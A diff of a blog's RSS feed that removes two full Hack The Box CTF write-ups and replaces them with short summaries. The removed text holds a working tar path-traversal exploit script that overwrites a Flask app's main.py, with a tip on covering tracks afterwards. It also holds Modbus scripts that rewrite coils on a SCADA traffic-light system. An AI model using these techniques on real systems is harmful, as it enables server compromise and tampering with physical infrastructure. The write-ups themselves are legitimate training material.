@@ -1,295 +1,36 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hack The Box on Yojan's Blog</title><link>/tags/hack-the-box/</link><description>Recent content in Hack The Box on Yojan's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 22 Nov 2021 15:16:32 -0500</lastBuildDate><atom:link href="/tags/hack-the-box/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB UNI CTF : Web Slippy</title><link>/p/htb-uni-ctf-web-slippy/</link><pubDate>Mon, 22 Nov 2021 15:16:32 -0500</pubDate><guid>/p/htb-uni-ctf-web-slippy/</guid><description>&lt;p>&lt;img src="/web_slippy/ChallengeDescription.png"
-loading="lazy"
->&lt;/p>
-&lt;h2 id="analyze">Analyze&lt;/h2>
-&lt;p>For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.&lt;/p>
-&lt;p>&lt;img src="/web_slippy/Website.png"
-loading="lazy"
->&lt;/p>
-&lt;p>The directory tree of the source code as follow.&lt;/p>
-&lt;pre tabindex="0">&lt;code>./challenge
-├── application
-│   ├── blueprints
-│   │   └── routes.py
-│   ├── config.py
-│   ├── main.py
-│   ├── static
-│   │   ├── archives
-│   │   ├── css
-│   │   │   ├── bootstrap.min.css
-│   │   │   └── main.css
-│   │   ├── images
-│   │   │   ├── card-body2.png
-│   │   │   ├── card-btm2.png
-│   │   │   ├── card-top2.png
-│   │   │   └── upload-doc.png
-│   │   └── js
-│   │   ├── bootstrap.min.js
-│   │   ├── jquery-3.6.0.min.js
-│   │   ├── main.js
-│   │   └── TweenMax.min.js
-│   ├── templates
-│   │   └── index.html
-│   └── util.py
-├── flag
-└── run.py
-&lt;/code>&lt;/pre>&lt;p>We can see that the flag file is in the same directory as the run.py&lt;/p>
-&lt;p>So I am assuming that we have to figure out a way to read the flag file.&lt;/p>
-&lt;p>&lt;em>&lt;strong>Util.py&lt;/strong>&lt;/em>&lt;/p>
-&lt;pre tabindex="0">&lt;code>import functools, tarfile, tempfile, os
-from application import main
-generate = lambda x: os.urandom(x).hex()
-def extract_from_archive(file):
-tmp = tempfile.gettempdir()
-path = os.path.join(tmp, file.filename)
-file.save(path)
-if tarfile.is_tarfile(path):
-tar = tarfile.open(path, &amp;#39;r:gz&amp;#39;)
-tar.extractall(tmp)
-extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
-os.makedirs(extractdir, exist_ok=True)
-extracted_filenames = []
-for tarinfo in tar:
-name = tarinfo.name
-if tarinfo.isreg():
-filename = f&amp;#39;{extractdir}/{name}&amp;#39;
-os.rename(os.path.join(tmp, name), filename)
-extracted_filenames.append(filename)
-continue
-os.makedirs(f&amp;#39;{extractdir}/{name}&amp;#39;, exist_ok=True)
-tar.close()
-return extracted_filenames
-return False
-&lt;/code>&lt;/pre>&lt;p>This is the code that is used to extract the given tar file.&lt;/p>
-&lt;p>Let&amp;rsquo;s examine this code a bit further.&lt;/p>
-&lt;pre tabindex="0">&lt;code>generate = lambda x: os.urandom(x).hex()
-&lt;/code>&lt;/pre>&lt;p>It is used to generate a random number of the length x. Another way of writing this would be.&lt;/p>
-&lt;pre tabindex="0">&lt;code>def generate(x):
-return os.urandom(x).hex()
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code> extractdir = f&amp;#39;{main.app.config[&amp;#34;UPLOAD_FOLDER&amp;#34;]}/{generate(15)}&amp;#39;
-os.makedirs(extractdir, exist_ok=True)
-&lt;/code>&lt;/pre>&lt;p>So here they use the generate to create a new folder to avoid files to collide when they have same name.&lt;/p>
-&lt;pre tabindex="0">&lt;code>➜ application git:(main) ✗ cat config.py
-from application.util import generate
-from os.path import abspath
-class Config(object):
-SECRET_KEY = generate(50)
-UPLOAD_FOLDER = &amp;#39;/app/application/static/archives&amp;#39;
-class ProductionConfig(Config):
-pass
-class DevelopmentConfig(Config):
-DEBUG = True
-class TestingConfig(Config):
-TESTING = True
-&lt;/code>&lt;/pre>&lt;p>We can see that the tar file gets extracted at path &lt;code>/app/application/static/archives/{somerandom}/&lt;/code>&lt;/p>
-&lt;p>We also know that the flag is at &lt;code>/app/&lt;/code>&lt;/p>
-&lt;h2 id="recon">Recon&lt;/h2>
-&lt;p>&lt;a class="link" href="https://bugzilla.redhat.com/show_bug.cgi?id=263261" target="_blank" rel="noopener"
->https://bugzilla.redhat.com/show_bug.cgi?id=263261&lt;/a>&lt;/p>
-&lt;p>By searching up on the internet, I found this cool bug in the tar file library in python.&lt;/p>
-&lt;p>After reading this for the first time, I thought I could use the &lt;code>../../../flag&lt;/code> as my file name and the download the flag. Seems pretty simple right?&lt;/p>
-&lt;p>Well Not really.&lt;/p>
-&lt;p>The &lt;code>os.rename()&lt;/code> overrides the existing file in the directory.&lt;/p>
-&lt;h2 id="exploit">Exploit&lt;/h2>
-&lt;p>For the exploit, I thought of overriding the &lt;code>main.py&lt;/code> file and adding a API endpoint that opens the flag and returns it.&lt;/p>
-&lt;pre tabindex="0">&lt;code>rom flask import Flask, jsonify
-from application.blueprints.routes import web, api
-app = Flask(__name__)
-app.config.from_object(&amp;#39;application.config.Config&amp;#39;)
-app.register_blueprint(web, url_prefix=&amp;#39;/&amp;#39;)
-app.register_blueprint(api, url_prefix=&amp;#39;/api&amp;#39;)
-@app.errorhandler(404)
-def not_found(error):
-return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Found&amp;#39;}), 404
-@app.errorhandler(403)
-def forbidden(error):
-return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Allowed&amp;#39;}), 403
-@app.errorhandler(400)
-def bad_request(error):
-return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Bad Request&amp;#39;}), 400
-@app.route(&amp;#39;/flag&amp;#39;)
-def flag():
-file = open(&amp;#39;/app/flag&amp;#39;, &amp;#39;r&amp;#39;)
-return f.read()
-&lt;/code>&lt;/pre>&lt;p>This is what the new main file will look like.&lt;/p>
-&lt;p>If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won&amp;rsquo;t figure out where we got the flag from.&lt;/p>
-&lt;pre tabindex="0">&lt;code>import tarfile, requests
-zpath = &amp;#34;../../../main.py&amp;#34;
-tf = tarfile.open(&amp;#34;payload.tar.gz&amp;#34;, &amp;#34;w:gz&amp;#34;)
-tf.add(&amp;#39;main.py&amp;#39;, zpath)
-tf.close()
-url = &amp;#34;http://64.227.36.32:32187/api/unslippy&amp;#34;
-files = {&amp;#34;file&amp;#34;: open(&amp;#39;payload.tar.gz&amp;#39;, &amp;#39;rb&amp;#39;)}
-r = requests.post(url, files=files)
-flag = requests.get(&amp;#34;http://64.227.36.32:32187/flag&amp;#34;)
-print(flag.text)
-&lt;/code>&lt;/pre>&lt;p>I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.&lt;/p>
-&lt;p>Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.&lt;/p>
-&lt;pre tabindex="0">&lt;code>HTB{i_slipped_my_way_to_rce}
-&lt;/code>&lt;/pre></description></item><item><title>HTB UNI CTF : Light The Way</title><link>/p/htb-uni-ctf-light-the-way/</link><pubDate>Sun, 21 Nov 2021 23:22:26 -0500</pubDate><guid>/p/htb-uni-ctf-light-the-way/</guid><description>&lt;img src="/hackthebox/unictf.png" alt="Featured image of post HTB UNI CTF : Light The Way" />&lt;p>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.&lt;/p>
-&lt;p>&lt;img src="/lighttheway/question.png"
-loading="lazy"
->&lt;/p>
-&lt;h2 id="scada">SCADA&lt;/h2>
-&lt;p>Supervisory control and data acquisition is a system that allows industrial organizations to:&lt;/p>
-&lt;pre>&lt;code>* Conrtol processes
-* Monitor
-* Interact with devices
-* Record events
-&lt;/code>&lt;/pre>
-&lt;p>&lt;a class="link" href="https://inductiveautomation.com/resources/article/what-is-scada" target="_blank" rel="noopener"
->For more information on SCADA&lt;/a>&lt;/p>
-&lt;h2 id="starting-point">Starting Point&lt;/h2>
-&lt;p>For this specific challenge, we needed to compromise traffic lights. There wasn&amp;rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.&lt;/p>
-&lt;p>&lt;img src="/lighttheway/HMI.png"
-loading="lazy"
->&lt;/p>
-&lt;p>The given IP was : &lt;code>10.129.96.95&lt;/code>&lt;/p>
-&lt;p>A website and the IP was all the information that I had. So, where did I begin?&lt;/p>
-&lt;h2 id="nmap">Nmap&lt;/h2>
-&lt;p>Yep, nmap. It allows us to scan the system and find information on it.&lt;/p>
-&lt;pre tabindex="0">&lt;code>nmap -p- 10.129.96.95 -sCV
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/nmap.png"
-loading="lazy"
-alt="test"
->&lt;/p>
-&lt;p>Key Points:&lt;/p>
-&lt;pre>&lt;code>* PORT 22 : used for SSH, I wouldn't even try to attack it
-* PORT 80 : running nginx server for the front end
-* PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it)
-&lt;/code>&lt;/pre>
-&lt;p>After figuring those stuff out, now&amp;rsquo;s the time to enumerate more information on the Modbus.&lt;/p>
-&lt;pre tabindex="0">&lt;code>nmap -p 502 --script modbus-discover 10.129.96.95
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/nmap2.png"
-loading="lazy"
->&lt;/p>
-&lt;p>Didn&amp;rsquo;t give much but it confirms that Modbus is running on port 502.&lt;/p>
-&lt;h3 id="more-info">More info!&lt;/h3>
-&lt;p>&lt;img src="https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif"
-loading="lazy"
->&lt;/p>
-&lt;p>What I have here isn&amp;rsquo;t enough to make the exploit. So, what should I do?&lt;/p>
-&lt;p>Turning back to my good old friend, internet I found a metaspolit script &lt;code>auxiliary/scanner/scada/modbus_findunitid&lt;/code>&lt;/p>
-&lt;p>Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&amp;rsquo;t let the script complete, but there are more than 200 units.&lt;/p>
-&lt;p>&lt;em>&lt;strong>Why are there so many?&lt;/strong>&lt;/em>
-There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?&lt;/p>
-&lt;p>Before answerinng that question let&amp;rsquo;s first look at what data the first unit has.&lt;/p>
-&lt;h2 id="get-data">Get DATA&lt;/h2>
-&lt;p>Let&amp;rsquo;s search if there&amp;rsquo;s any more metaspolit script that we can use.&lt;/p>
-&lt;pre tabindex="0">&lt;code>msf6&amp;gt; search modbus
-&lt;/code>&lt;/pre>&lt;p>After searching for modbus, I found 6 modules/scripts&lt;/p>
-&lt;pre tabindex="0">&lt;code>Matching Modules
-================
-# Name Disclosure Date Rank Check Description
-- ---- --------------- ---- ----- -----------
-0 auxiliary/analyze/modbus_zip normal No Extract zip from Modbus communication
-1 auxiliary/scanner/scada/modbus_banner_grabbing normal No Modbus Banner Grabbing
-2 auxiliary/scanner/scada/modbusclient normal No Modbus Client Utility
-3 auxiliary/scanner/scada/modbus_findunitid 2012-10-28 normal No Modbus Unit ID and Station ID Enumerator
-4 auxiliary/scanner/scada/modbusdetect 2011-11-01 normal No Modbus Version Scanner
-5 auxiliary/admin/scada/modicon_stux_transfer 2012-04-05 normal No Schneider Modicon Ladder Logic Upload/Download
-6 auxiliary/admin/scada/modicon_command 2012-04-05 normal No Schneider Modicon Remote START/STOP Command
-&lt;/code>&lt;/pre>&lt;p>Modbusclient module seems to be the most useful for this case.&lt;/p>
-&lt;pre tabindex="0">&lt;code>msf6&amp;gt; use auxiliary/scanner/scada/modbusclient
-msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; show options
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/meta1.png"
-loading="lazy"
->&lt;/p>
-&lt;p>So the RHOST for this instance will be the IP address : &lt;code>10.129.96.95&lt;/code>&lt;/p>
-&lt;pre tabindex="0">&lt;code>set RHOST 10.129.96.95
-&lt;/code>&lt;/pre>&lt;p>We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field&lt;/p>
-&lt;pre tabindex="0">&lt;code>set DATA_ADDRESS 0
-&lt;/code>&lt;/pre>&lt;p>Then we need to set how many DATA_ADDRESS we want to read.&lt;/p>
-&lt;pre tabindex="0">&lt;code>set NUMBER 18
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/meta2.png"
-loading="lazy"
->&lt;/p>
-&lt;p>Let&amp;rsquo;s see what those numbers mean.&lt;/p>
-&lt;p>This small python command takes the arr of int and converts to a string.&lt;/p>
-&lt;pre tabindex="0">&lt;code>arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]
-print(&amp;#34;&amp;#34;.join(chr(x) for x in arr))
-&lt;/code>&lt;/pre>&lt;p>With the python script I was able to get a string: &lt;code>auto_mode:true&lt;/code>&lt;/p>
-&lt;h2 id="setting-it-to-manual">Setting it to manual&lt;/h2>
-&lt;p>If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.&lt;/p>
-&lt;pre tabindex="0">&lt;code>print([ord(x) for x in &amp;#34;auto_mode:false&amp;#34;])
-&lt;/code>&lt;/pre>&lt;p>Used this python script to get the numbers that we need to send in order to set the SCADA system to false.&lt;/p>
-&lt;pre tabindex="0">&lt;code>[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
-&lt;/code>&lt;/pre>&lt;p>I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
-&lt;img src="https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif"
-loading="lazy"
->&lt;/p>
-&lt;p>Yea, I later figured out that python had a library to connect to modbus, but anyways it works.&lt;/p>
-&lt;pre tabindex="0">&lt;code>import subprocess
-for i in range(1,20): # : f a l s e
-cmd = f&amp;#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&amp;#34;
-subprocess.run(cmd.split(&amp;#34; &amp;#34;))
-&lt;/code>&lt;/pre>&lt;p>&lt;code>modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}&lt;/code>&lt;/p>
-&lt;p>I set it to the first 20 to see if that would make any difference. It didn&amp;rsquo;t make any visual difference. But if I look at the registers again, it changed the values.&lt;/p>
-&lt;p>&lt;img src="/lighttheway/meta3.png"
-loading="lazy"
->
-&lt;em>First one is before running the script, second one is after running the python script.&lt;/em>&lt;/p>
-&lt;p>So, if that didn&amp;rsquo;t change anything, what can I do?&lt;/p>
-&lt;p>Coils also store values, and I can read and write it.&lt;/p>
-&lt;h2 id="reading-coils">Reading Coils&lt;/h2>
-&lt;pre tabindex="0">&lt;code>msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set action READ_COILS
-&lt;/code>&lt;/pre>&lt;p>Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.&lt;/p>
-&lt;pre tabindex="0">&lt;code>msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set NUMBER 2000
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/meta4.png"
-loading="lazy"
->&lt;/p>
-&lt;p>After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.&lt;/p>
-&lt;p>Let&amp;rsquo;s see what other Units have.&lt;/p>
-&lt;pre tabindex="0">&lt;code>msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set UNIT_NUMBER 2
-&lt;/code>&lt;/pre>&lt;p>UNIT_NUMBER determines which slave node we are viewing.&lt;/p>
-&lt;p>After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.&lt;/p>
-&lt;pre tabindex="0">&lt;code>from pyModbusTCP.client import ModbusClient
-data_address = {}
-for i in range(1,7):
-c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=i, auto_open=True)
-regs = c.read_coils(0,2000)
-data_address[i] = regs.index(True)
-print(data_address)
-&lt;/code>&lt;/pre>&lt;p>I wrote this script to get the DATA_ADDRESS of all the 1/True places.&lt;/p>
-&lt;pre tabindex="0">&lt;code>{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
-&lt;/code>&lt;/pre>&lt;h1 id="the-exploit">The exploit?&lt;/h1>
-&lt;p>Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.&lt;/p>
-&lt;p>The first three bits represents the North side of the light, and goes in order of&lt;/p>
-&lt;p>Green Yellow Red&lt;/p>
-&lt;p>IF we curl the api &lt;code>http://10.129.96.95/api&lt;/code> we can see value for all the colors and the direction.&lt;/p>
-&lt;p>&lt;img src="/lighttheway/curl.png"
-loading="lazy"
->&lt;/p>
-&lt;p>After doing some digging I found out that the API doesn&amp;rsquo;t represent the data in the same way the registers stores the data.&lt;/p>
-&lt;p>In the registers we need to pass in data as follow:&lt;/p>
-&lt;pre tabindex="0">&lt;code>NG NY NR EG EY ER SG SY SR WG WY WR
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="/lighttheway/lights.png"
-loading="lazy"
->&lt;/p>
-&lt;p>Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.&lt;/p>
-&lt;p>So the values for junction one are as follow:&lt;/p>
-&lt;pre tabindex="0">&lt;code>[False, False, True, False, False, True, False, False, True, True, False, False]
-&lt;/code>&lt;/pre>&lt;p>This will turn on the green light on the west.&lt;/p>
-&lt;pre tabindex="0">&lt;code>[False, False, True, False, False, True, False, False, True, False, False, True]
-&lt;/code>&lt;/pre>&lt;p>So, What I was saying about the direction didn&amp;rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&amp;rsquo;t sense to me, it might be becuase the difference in driving in different country.&lt;/p>
-&lt;p>The following script did the job.&lt;/p>
-&lt;pre tabindex="0">&lt;code>from pyModbusTCP.client import ModbusClient
-data_address = {}
-c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=1, auto_open=True)
-for i in range(1,7):
-c.unit_id(i)
-regs = c.read_coils(0,2000)
-data_address[i] = regs.index(True)
-c.unit_id(1)
-c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])
-c.unit_id(2)
-c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])
-c.unit_id(4)
-c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])
-c.unit_id(6)
-c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
-&lt;/code>&lt;/pre>&lt;p>After running the script, the car moved and I found the flag.&lt;/p>
-&lt;p>&lt;img src="/lighttheway/lighttheway.gif"
-loading="lazy"
->&lt;/p>
-&lt;p>Flag:&lt;code>HTB{w3_se3_tH3_l1ght}&lt;/code>&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Hack The Box on Blog</title>
+    <link>https://git.drmoscovium.xyz/tags/hack-the-box/</link>
+    <description>Recent content in Hack The Box on Blog</description>
+    <image>
+      <url>https://git.drmoscovium.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://git.drmoscovium.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 22 Nov 2021 15:16:32 -0500</lastBuildDate><atom:link href="https://git.drmoscovium.xyz/tags/hack-the-box/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB UNI CTF : Web Slippy</title>
+      <link>https://git.drmoscovium.xyz/post/writeups/htb-uni-ctf/web-slippy/</link>
+      <pubDate>Mon, 22 Nov 2021 15:16:32 -0500</pubDate>
+      
+      <guid>https://git.drmoscovium.xyz/post/writeups/htb-uni-ctf/web-slippy/</guid>
+      <description>Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
+The directory tree of the source code as follow.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ./challenge ├── application │ ├── blueprints │ │ └── routes.</description>
+    </item>
+    
+    <item>
+      <title>HTB UNI CTF : Light The Way</title>
+      <link>https://git.drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/</link>
+      <pubDate>Sun, 21 Nov 2021 23:22:26 -0500</pubDate>
+      
+      <guid>https://git.drmoscovium.xyz/post/writeups/htb-uni-ctf/lighttheway/</guid>
+      <description>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
+SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
+* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA</description>
+    </item>
+    
+  </channel>
+</rss>
